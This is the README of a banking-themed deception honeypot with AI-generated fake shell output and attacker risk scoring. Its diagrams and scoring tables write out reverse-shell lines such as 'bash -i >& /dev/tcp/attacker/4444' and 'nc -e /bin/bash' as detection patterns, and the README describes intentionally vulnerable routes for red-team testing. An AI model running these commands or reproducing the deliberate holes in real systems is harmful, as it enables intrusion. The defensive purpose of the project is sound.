# Maze Myth — Dynamic Banking Honeypot

> **A real-time deception platform that traps attackers in an AI-powered banking maze, analyzes their behavior, and never lets them know they're caught.**

---

## 🔥 The Problem

Traditional honeypots are **easily fingerprinted**:

| Problem | Impact |
|---------|--------|
| Static endpoints | Trivially detected in seconds |
| Predictable responses | Reveals fakeness immediately |
| No file upload / webshell simulation | Misses an entire attack vector |
| Zero attacker behavior profiling | You lose context after they disconnect |
| Not production-ready | Can't safely expose to real traffic |

**Result**: You capture 10 seconds of recon before they disappear.

---

## 🧠 The Solution — Three Deception Layers

```mermaid
graph TB
    subgraph L1["🌐 Layer 1 — Dynamic API Maze"]
        A1["Infinite AI-generated endpoints"]
        A2["Unique banking responses per attacker"]
        A3["Path-aware Gemini JSON generation"]
    end

    subgraph L2["📤 Layer 2 — CVE-2020-36179 Upload Trap + Shell RAG"]
        B1["Proxy routes suspicious traffic"]
        B2["Spring/PHP upload portals capture payloads"]
        B3["Shell RAG generates realistic command output"]
    end

    subgraph L3["🧠 Layer 3 — Attacker Intelligence"]
        C1["Per-IP risk ranking & engagement scoring"]
        C2["Phase detection: RECON → EXPLOIT → POST_EXPLOIT → LATERAL"]
        C3["Dashboard analytics + deception recommendations"]
    end

    L1 --> L2
    L2 --> L3
    L3 -.->|"Feeds risk-scored profiles back"| L1
    C1 --> C3
    C2 --> C3
```
---

## 🗺️ How the Attack Flow Works

### Layer 1 — Dynamic API Maze (Always Active)

```mermaid
flowchart TD
    A(["🌐 Attacker hits any URL"]) --> B{Fixed route?}
    B -->|Yes| C["BankingDataGenerator\nreturns fresh randomized JSON\nevery request — never repeats"]
    B -->|No| D["Dynamic catch-all:\nmaze_generator validates path\nassigns access level"]
    D --> E["Gemini LLM generates\nrealistic banking API response\nbased on path context"]
    E --> F{20% chance}
    F -->|Yes| G["FileGenerator creates\nbait file + unique beacon ID\nPDF · XLSX · CSV · XML · JSON · JS · DB"]
    F -->|No| H["Return JSON response\n+ breadcrumb hints to next route"]
    G --> H
    H --> I["Response cached in SQLite\nsame URL → same AI response forever"]
    I --> J{Attacker downloads file?}
    J -->|Yes| K["💥 CRITICAL alert logged\nBase64-encoded to disk + SQLite\nIP + UA + timestamp"]
    K --> L{Attacker opens file?}
    L -->|Yes| M["🔍 Beacon fires\nCallback tracked by honeypot"]
    M --> N(["🔁 Maze continues forever..."])
```

---

### Layer 2 — CVE-2020-36179 File Upload Trap

```mermaid
sequenceDiagram
    actor A as 🎭 Attacker
    participant P as Proxy
    participant H as Honeypot (8001)
    participant R as Real App (8080)
    participant Intel as AttackerIntel
    participant RAG as Shell RAG Engine
    participant LLM as Gemini AI

    A->>P: GET /clientportal/support/attachments.php
    P->>Intel: evaluate_ip_risk(A)
    alt high risk or suspicious
        P->>H: forward request to honeypot
    else low risk
        P->>R: forward request to decoy real app
    end

    H->>Intel: record_form_view(ip)
    H-->>A: Realistic PHP form (Apache/2.4.54 + PHP/7.4.33 headers)

    Note over A: Uploads shell.php containing webshell code

    A->>H: POST /clientportal/support/attachments.php
    H->>Intel: record_upload(ip, filename, bytes)
    Note over H: 13-pattern webshell check + 18-tag file analysis<br/>Register in _shell_registry — NO disk write
    H-->>A: ✅ Upload success + /uploads/shell.php URL

    A->>H: GET /uploads/shell.php?cmd=ls -la
    H->>Intel: record_webshell_access(ip, cmd)
    H->>RAG: resolve_shell_command("ls -la")
    RAG->>LLM: Generate realistic Apache2 directory listing
    Note over LLM: Full AI-generated output with realistic<br/>filenames, permissions, timestamps
    LLM-->>H: "drwxr-xr-x 3 www-data www-data..."
    H-->>A: Realistic directory listing

    A->>H: GET /uploads/shell.php?cmd=cat config.php
    H->>RAG: resolve_shell_command("cat config.php")
    RAG->>LLM: Generate realistic PHP banking app source
    LLM-->>H: "<?php $db_host = 'db-primary-1.internal'..."
    H-->>A: Realistic PHP credentials file

    Note over A: Tries reverse shell

    A->>H: GET /uploads/shell.php?cmd=bash -i >& /dev/tcp/attacker/4444
    H->>Intel: record_command → phase=POST_EXPLOIT risk=95
    Note over H: Dynamic handler: random 1.5–3s delay
    H-->>A: "bash: connect: Connection timed out"
```

---

### Layer 3 — Attacker Intelligence & Risk Ranking

The intelligence engine grades every attacker action with a numeric risk score and maps behavior into a session profile.
It uses regex-based command classification in `src/attacker_intel.py`, then advances the session phase and adjusts engagement accordingly.

Key metrics:
- `attacker_risk`: average command risk score across all recorded commands (0–100)
- `current_phase` / `phase_label`: session phase advanced by the highest-severity command seen
- `engagement_score`: increases with form views, uploads, commands, and webshell execution
- `top_commands`: commands sorted by `risk_score` and labeled with phase
- `uploaded_files`: extension risk, payload tags, and threat level
- `deception`: next-stage lure recommendations based on phase and previous activity

Command scoring is mapped by category:

| Phase | Score range | Example commands |
|-------|-------------|------------------|
| RECON | 15–35 | `whoami`, `id`, `ls`, `ifconfig`, `env`, `history` |
| EXPLOIT | 45–80 | `cat /etc/shadow`, `sudo -l`, `curl http`, `wget http`, `chmod 4755`, `useradd` |
| POST_EXPLOIT | 85–95 | `bash -i >& /dev/tcp`, `nc -e /bin`, `python -c socket.connect`, `perl -e socket`, `php -r fsockopen` |
| LATERAL | 65–80 | `ssh user@host`, `scp`, `rsync`, `crontab -e`, `at` |

If no command pattern matches, the system still records a default RECON-level score of `10`.

Engagement scoring increments:
- `FORM_VIEW` +2
- `UPLOAD_SAFE` +5
- `UPLOAD_SHELL` +25
- `CMD` + (`risk_score // 5`)
- `WEBSHELL_EXEC` +15

```mermaid
flowchart LR
    subgraph Events["📡 Recorded Events (per IP)"]
        E1["🖥️ Form View\nform visit logged"]
        E2["📁 File Upload\nsafe / dangerous / webshell"]
        E3["⚡ ?cmd= Execution\nrisk scored 0–100"]
        E4["🐚 Webshell Exec\nfull command + AI output"]
    end

    subgraph Session["🧠 AttackerSession Object"]
        direction TB
        S1["📍 IP Geolocation\ncountry · ISP · VPN? · ASN"]
        S2["🔄 Phase Machine\nIDLE→RECON→EXPLOIT→POST_EXPLOIT→LATERAL"]
        S3["🚦 Attacker Risk\n0–100 average command risk score"]
        S4["📊 Engagement Score\n0–100 behavior intensity"]
        S5["🔬 File Analysis\n(extension risk + payload tags)"]
        S6["💀 Command Timeline\nrisk-sorted top 15 commands"]
        S7["🎯 Deception Hints\nnext bait move suggestions"]
    end

    subgraph Output["📊 Dashboard Output"]
        D1["Global Stats\nuploads · webshells · rev-shells"]
        D2["Top Attackers\nby engagement score"]
        D3["Phase Distribution\nhow far attackers have gotten"]
        D4["Dangerous Commands\ntop 20 by risk score"]
        D5["Per-IP Deep Profile\nfull timeline + deception hints"]
    end

    Events --> Session
    Session --> Output
```

---

### Attack Phase State Machine

```mermaid
stateDiagram-v2
    direction LR
    [*] --> IDLE : IP connects

    IDLE --> RECON : whoami / id / ls / hostname
    RECON --> EXPLOIT : cat /etc/shadow / sudo -l / SUID hunt
    EXPLOIT --> POST_EXPLOIT : bash -i >& /dev/tcp / nc -e / python socket
    POST_EXPLOIT --> LATERAL : ssh user@host / crontab -e / scp

    LATERAL --> [*]

    note right of RECON
        Risk: 15–35
        whoami, id, hostname,
        ps aux, ifconfig, env, history
    end note

    note right of EXPLOIT
        Risk: 45–80
        sudo -l, cat /etc/shadow,
        useradd, curl/wget, chmod 4755
    end note

    note right of POST_EXPLOIT
        Risk: 85–95
        bash -i >& /dev/tcp/...
        nc -e /bin/bash
        python3 socket.connect
    end note
```

---

### Shell RAG — 6-Step Resolution Pipeline

```mermaid
flowchart TD
    CMD(["?cmd=<command>"]) --> S1

    S1{"1️⃣ Gemini LLM\nPrimary engine — always called first\nGenerates dynamic, unique output"}
    S1 -->|Generated| OUT(["Return output to attacker"])
    S1 -->|LLM disabled| S2

    S2{"2️⃣ Exact cache\n58 ground-truth commands"}
    S2 -->|Hit| OUT
    S2 -->|Miss| S3

    S3{"3️⃣ Case-insensitive\nexact match"}
    S3 -->|Hit| OUT
    S3 -->|Miss| S4

    S4{"4️⃣ Dynamic handler\necho · cd · ls paths · cat paths\nrevshell → 1.5–3s delay + random error"}
    S4 -->|Handled| OUT
    S4 -->|Miss| S5

    S5{"5️⃣ TF-IDF fuzzy match\nCowrie 235-session dataset\nthreshold ≥ 0.85"}
    S5 -->|Score ≥ 0.85| OUT
    S5 -->|Score < 0.85| S6

    S6["6️⃣ Fallback\nbash: command: command not found"]
    S6 --> OUT
```

---

### Storage & Log Architecture

```mermaid
flowchart TD
    E(["Any event in honeypot.py\nor file_upload_rce.py"]) --> L[logger.info/warning/critical]

    L --> H1["EncodedFileHandler\nBase64-encodes every log line\n→ log_files/api_audit.log"]
    L --> H2["SQLiteLogHandler\nPlain-text structured entry\n→ databases/honeypot.db → logs table"]
    L --> H3["StreamHandler\nColor-coded console output"]

    subgraph SQLite["🗄️ honeypot.db — WAL Mode — SQLite"]
        T1["endpoints\nAI-generated responses (path+method → JSON)"]
        T2["beacons\nBait file tokens + activation tracking"]
        T3["downloads\nEvery /download/* hit (IP, UA, timestamp)"]
        T4["objects\nFake objects reused across sessions"]
        T5["logs\nFull structured audit log — queryable"]
    end

    H2 --> SQLite
```

---

## ✅ Feature Status

| # | Feature | Status |
|---|---------|--------|
| 1 | Docker + Gunicorn production deployment | ✅ Done |
| 2 | Multi-stage Dockerfile (non-root user, health checks) | ✅ Done |
| 3 | SQLite state (WAL mode, 5 tables, 90-day retention) | ✅ Done |
| 4 | Base64-encoded audit log (`log_files/api_audit.log`) | ✅ Done |
| 5 | Dual-write: Base64 file log + queryable SQLite `logs` table | ✅ Done |
| 6 | Gemini AI — banking API response generation | ✅ Done |
| 7 | Gemini AI — shell command + directory output generation | ✅ Done |
| 8 | Gemini AI — PHP banking source code generation (on `cat`) | ✅ Done |
| 9 | Gemini AI — bait file content generation | ✅ Done |
| 10 | Dynamic banking data (randomized per request, never repeats) | ✅ Done |
| 11 | Multi-format tracked bait files + beacons (10+ formats) | ✅ Done |
| 12 | CVE-2020-36179 File Upload RCE deception | ✅ Done |
| 13 | Hybrid Shell RAG Engine (Gemini-first + Cowrie fallback) | ✅ Done |
| 14 | Attacker Intelligence, Phase Classification & Risk Ranking | ✅ Done |
| 15 | IP Geolocation (ip-api.com, no key needed) | ✅ Done |
| 16 | Deception Strategy Advisor | ✅ Done |
| 17 | **Real-App Vulnerability Layer** — 6 exploitable routes with [VULN:TAG] logging | ✅ Done |
| 18 | **Honeypot IP Gate** — only score ≥ 100 IPs enter; others get 404 | ✅ Done |
| 19 | **Dashboard Real-App Attack Monitor** — live risk score leaderboard + exploit feed | ✅ Done |
| 20 | **Dockerfile — zero apt-get build deps** — pure manylinux wheels, faster builds | ✅ Done |
| 21 | SQLite database encryption at rest | 🔜 Planned |
| 22 | LLM Offline Fallback (Ollama) | 🔜 Planned |
| 23 | Webhook + SIEM Alerts | 🔜 Planned |
| 24 | Tarpit Mode | 🔜 Planned |

---

## 🚀 Key Features

### 1. Dynamic API Maze — Infinite Endpoints
Every attacker sees **different data on every request**. No fingerprinting possible:
- **Companies**: 8–20 per call · **Accounts**: 15–40 · **Transactions**: 20–100 · **Payments**: 10–35
- **Gemini LLM** generates realistic JSON for any unknown path (context-aware, path-matched)
- **Consistency**: same URL → same AI response forever (cached in SQLite)
- **Breadcrumbs**: each response hints at the next route, keeping attackers exploring deeper

### 2. CVE-2020-36179 — File Upload RCE Trap
Simulates a vulnerable banking document upload portal:
- **Two realistic endpoints**: Spring Java compliance portal + PHP client support portal
- **Deceptive headers**: `Apache-Coyote/1.1` / `Apache/2.4.54 (Debian)` with matching `X-Powered-By`
- **13-pattern webshell detection**: PHP system/eval/passthru/base64_decode/`$_GET`/etc.
- **In-memory shell registry**: uploaded filenames tracked in `_shell_registry` — **no files ever written to disk**
- **18-pattern file analysis**: threat level (LOW/MEDIUM/HIGH/CRITICAL), extension risk, payload tags

### 3. Gemini-Powered Shell — AI Directory & File Generation
The webshell is fully AI-driven, not just templated:
- **`ls` commands**: Gemini generates realistic directory listings with current timestamps, random inodes, correct www-data permissions
- **`cat <file>`** on PHP files: Gemini generates realistic PHP banking app source code with real DB credentials embedded (e.g., `$db_host = 'db-primary-1.internal'`)
- **`cat` on config files**: Gemini generates plausible Apache/PHP config, `.env` contents, credential files
- **Novel commands**: Gemini handles any unknown command with context-aware realistic output
- **Reverse shell attempts**: Dynamic handler adds 1.5–3s random delay then returns varied connection-refused/timeout messages

### 4. Gemini AI — Ground-Truth Bootstrapping
On startup, Gemini pre-generates all 58+ ground-truth command responses:
```
Prompt: "You are a compromised Ubuntu 22.04 Apache2+PHP server.
Generate exact terminal output for [58 commands]..."
```
This produces server-specific, contextually correct responses for identity commands (`whoami`, `id`, `hostname`, `ifconfig`, `env`) before any attacker connects.

### 5. Dual-Layer Persistence — SQLite + Encoded Logs
The database and audit system are production-grade:
- **Migrated from TinyDB → SQLite** for reliability, concurrency, and queryability
- **WAL mode** (`PRAGMA journal_mode=WAL`) — safe under Gunicorn's multi-threaded workers
- **5 indexed tables**: `endpoints`, `beacons`, `downloads`, `objects`, `logs`
- **Audit logs Base64-encoded** to `log_files/api_audit.log` — resists casual tampering
- **Dual-write**: every event also written as plain-text to SQLite `logs` table for dashboard queries
- **90-day auto-retention**: records older than 90 days purged automatically on startup

### 6. Production Deployment — Docker Compose Multi-Service Deception
Ready for real internet-facing deployments:
- **Multi-stage Dockerfile**: `builder` stage compiles C extensions, `base` stage is minimal runtime
- **Multi-service platform**: `proxy`, `real-app`, `honeypot`, `dashboard`
- **Reverse proxy + risk engine**: OpenResty proxy routes traffic to the real decoy or honeypot
- **Non-root user**: all Python processes run as `honeypot` (uid=1001) — never root
- **Health checks**: Docker restart policies keep services running
- **Named volumes**: `honeypot-logs`, `honeypot-db` persist across container restarts
- **Dashboard isolation**: `dashboard` container mounts volumes as `:ro` (read-only)

### 7. Attacker Intelligence Dashboard
Full behavioral profiling of every attacker IP with exact session metrics pulled from `src/attacker_intel.py`:

- `current_phase` / `phase_label` show the active attacker kill-chain stage
- `engagement_score` increases with form views, uploads, commands, and webshell execution
- `attacker_risk` is computed as the average `risk_score` of all recorded commands
- `top_commands` are sorted by `risk_score` and include `phase` plus human-readable labels
- `uploaded_files` include `extension_risk`, `threat_level`, and payload detection tags

```
GET /api/dashboard/cve/file-upload             → Global intelligence summary
GET /api/dashboard/cve/file-upload/attackers   → All attacker profiles (sorted by engagement)
GET /api/dashboard/cve/file-upload/attacker/<ip> → Per-IP deep profile with timeline
```

### 8. Multi-Format Bait Files with Beacons
Every downloaded file has a **unique beacon ID** embedded. 10+ formats:

| Format | Extension | Beacon method |
|--------|-----------|---------------|
| PDF | `.pdf` | URL in footer |
| Excel | `.xlsx` | Hyperlink in cell |
| CSV | `.csv` | URL column |
| XML | `.xml` | `<beacon>` tag |
| JSON | `.json` | `_beacon_url` field |
| JavaScript | `.js` | `fetch()` call |
| SQLite | `.db` / `.sqlite` | Row in `_tracking` table |
| Text | `.txt` | URL at bottom |
| SQL | `.sql` | Comment with URL |

### 9. Real-App Vulnerability Layer — 6 Exploitable Routes

The `real-app` service exposes 6 intentionally vulnerable endpoints for red-team testing. Every hit logs a `[VULN:TAG]` event to `real_app.log` and increments the IP's risk score:

| Route | Vulnerability | Tag | Points |
|-------|--------------|-----|--------|
| `GET /api/search?q=` | SQL Injection | `SQLI` | +20 |
| `GET /api/files?path=` | Path Traversal | `PATH_TRAVERSAL` | +25 |
| `GET /api/admin/users` | Admin Enumeration | `ADMIN_ENUM` | +20 |
| `POST /api/execute` | Command Injection | `CMD_INJECTION` | +40 |
| `POST /api/upload` | Webshell Upload | `WEBSHELL_UPLOAD` | +40 |
| `GET /api/account?id=` | IDOR | `IDOR` | +10 |

The dashboard's **REAL-APP ATTACKS** tab parses these events from `real_app.log` and shows per-IP risk score leaderboards and a live exploit feed in real-time. See `EXPLOITATION_GUIDE.md` and `docs/ATTACK_REAL_SYSTEM.md` for full attack walkthroughs.

### 10. Honeypot IP Gate — Invisible to Low-Risk Traffic

The honeypot (`honeypot.py`) enforces an IP gate on every request via `honeypot_gate()` (`@app.before_request`):

- **Score ≥ 100 via proxy header** (`X-Risk-Score`) → IP admitted and remembered
- **Previously approved attacker** (in `_APPROVED_ATTACKERS` set) → admitted
- **Loopback** (`127.0.0.1`) → admitted (Docker health checks)
- **Dashboard API paths** from internal subnet → admitted (monitor.py polling)
- **Everything else** → `404 Not Found` — honeypot is completely invisible

This ensures that curious low-risk users or scanners who find port 8001 see nothing. Only the proxy — having confirmed score ≥ 100 — can route traffic in.

---

## 📁 Architecture

```
Maze-Myth-Dynamic-Honeypot/
│
├── honeypot.py               ← Main Flask app (all routes, ~1100+ lines)
│                               honeypot_gate() — IP gate (score ≥ 100 only)
│                               Base64 log handler + SQLite log handler
│                               Gunicorn-compatible WSGI entry point
├── run_honeypot.bat          ← Windows: double-click to start
│
├── docker/
│   ├── Dockerfile            ← Multi-stage build (no apt-get build deps,
│   │                           pure manylinux wheels, non-root, health checks)
│   └── .dockerignore
│
├── docker-compose.yaml      ← Production: proxy, real-app, honeypot, dashboard, network isolation
│
├── proxy/                   ← OpenResty reverse proxy with risk engine
│   ├── Dockerfile
│   ├── nginx.conf
│   └── lua/risk_engine.lua   ← IP risk scoring + sticky honeypot assignment
│
├── real-app/                ← Decoy banking site + 6 vulnerable routes
│   ├── app.py               ← [VULN:TAG] logging, 6 exploitable endpoints
│   └── templates/
│
├── src/
│   ├── file_upload_rce.py    ← CVE-2020-36179 deception module ⭐
│   ├── attacker_intel.py     ← Behavior analysis & profiling engine ⭐
│   ├── api_generator/        ← Maze routing & access control
│   ├── data_generator/       ← Dynamic fake banking data (Faker + random)
│   ├── file_generator/       ← Tracked bait files (PDF, XLSX, CSV…)
│   ├── llm/                  ← Gemini API integration (banking + file content)
│   ├── rag/
│   │   ├── rag_loader.py     ← Banking domain RAG context
│   │   ├── shell_rag_loader.py ← 6-step shell engine (Gemini-first) ⭐
│   │   └── shell_rag.pkl     ← Cowrie-trained fallback model
│   └── state/                ← SQLite persistence (WAL mode)
│       └── state_manager.py  ← 5 tables + log_entry + log_download
│
├── dashboard/                ← Operator monitoring UI
│   ├── index.html            ← Dashboard UI (port 8002)
│   │                           REAL-APP ATTACKS tab — live risk score leaderboard
│   └── monitor.py            ← Dashboard Flask → Gunicorn backend
│                               /api/real/attacks — [VULN:TAG] parser + risk scorer
│
└── Dataset/                  ← shell_rag.pkl + ai_cmd_cache.json

Docs:
├── EXPLOITATION_GUIDE.md     ← Complete red-team attack guide ⭐
└── docs/
    ├── ATTACK_GUIDE.md       ← CVE-2020-36179 honeypot attack guide
    ├── ATTACK_REAL_SYSTEM.md ← 6 vulnerable routes + redirect guide ⭐
    ├── DEPLOYMENT.md         ← Docker production deployment
    ├── RUN_STEPS.md          ← Quick start steps
    ├── AUDIT_LOGS_GUIDE.md   ← Log format and query reference
    └── SECURITY.md           ← Security considerations
```

---

## 🚀 Quick Start

### Option A — Docker (Production, Recommended)

```bash
git clone https://github.com/Mark-Meka/Maze-Myth-Dynamic-Honeypot.git
cd Maze-Myth-Dynamic-Honeypot
cp .env.template .env
# Edit .env: GEMINI_API_KEY=your_key_here
docker compose -f docker-compose.yaml up -d
```

Services start with Gunicorn, health checks, named volumes, and automatic restart.

### Option B — Windows (One Click)

```
Double-click run_honeypot.bat
```

### Option C — Manual Setup

```bash
# 1. Install dependencies
pip install -r requirements.txt

# 2. Configure Gemini API
cp .env.template .env
# Edit .env → GEMINI_API_KEY="AIzaSy...your-key..."

# 3. Run both services
python honeypot.py            # Terminal 1 — Honeypot  (port 8001)
python dashboard/monitor.py  # Terminal 2 — Dashboard (port 8002)
```

| Service | URL | Audience |
|---------|-----|----------|
| 🌐 Proxy | `http://localhost` | **Attackers** — expose this |
| 🎯 Honeypot (manual only) | `http://localhost:8001` | Internal only when running standalone |
| 📊 Dashboard | `http://localhost:8002` | **Operators only** |
| 🔍 Intel API | `http://localhost:8002/api/intel/summary` | **Operators only** |

---

## �️ Key Files

| File | Purpose |
|------|---------|
| `docker-compose.yaml` | Full platform orchestration: `proxy`, `real-app`, `honeypot`, `dashboard`, `deception-net` network |
| `docker/Dockerfile` | Multi-stage build — **no apt-get build deps**, pure manylinux wheels, non-root, health checks |
| `proxy/nginx.conf` | OpenResty reverse proxy routing and HTTP headers |
| `proxy/lua/risk_engine.lua` | Per-IP risk scoring, sticky honeypot assignment, redirect logic |
| `real-app/app.py` | Decoy banking application + **6 vulnerable routes** with `[VULN:TAG]` logging |
| `honeypot.py` | Main honeypot Flask app: IP gate, API maze, CVE upload trap, audit logging |
| `dashboard/monitor.py` | Operator monitoring backend — `/api/real/attacks` risk score parser |
| `dashboard/index.html` | Dashboard UI — includes **REAL-APP ATTACKS** tab with live leaderboard |
| `src/file_upload_rce.py` | CVE-2020-36179 upload trap logic and webshell registration |
| `src/attacker_intel.py` | Per-IP attacker profiling, phase classification, engagement scoring |
| `src/rag/shell_rag_loader.py` | Hybrid shell command engine: Gemini-first + cached fallback |
| `EXPLOITATION_GUIDE.md` | **Complete red-team attack guide** — all 6 routes, chains, dashboard monitoring |
| `docs/ATTACK_REAL_SYSTEM.md` | Vulnerable route reference with curl examples |
| `.env.template` | Environment/template variables for API and internal URLs |

---

## �🔐 Environment Variables

```ini
# .env  (copy from .env.template)
GEMINI_API_KEY=AIzaSy...your-key-here...
HONEYPOT_URL=http://localhost
HONEYPOT_INTERNAL_URL=http://10.0.0.3:8001
LLM_MODEL=gemma-3-27b-it
```

> See `AUDIT_LOGS_GUIDE.md` for log collection, event tags, and query examples.

---

## 🔒 Security Warning

> ⚠️ **This is a deception tool. Run in an isolated environment (VM / container / VLAN).**
>
> - **Never expose port 8002** — dashboard is for operators only; use SSH tunneling for remote access.
> - Expose only the `proxy` service on port `80`; keep `honeypot` and `real-app` internal to `deception-net`.
> - Review `DEPLOYMENT.md` before any production deployment.

---

## 📜 License

MIT License — See [LICENSE](LICENSE)

## 📞 Contact

**Author**: Mark Meka | **GitHub**: [@Mark-Meka](https://github.com/Mark-Meka)
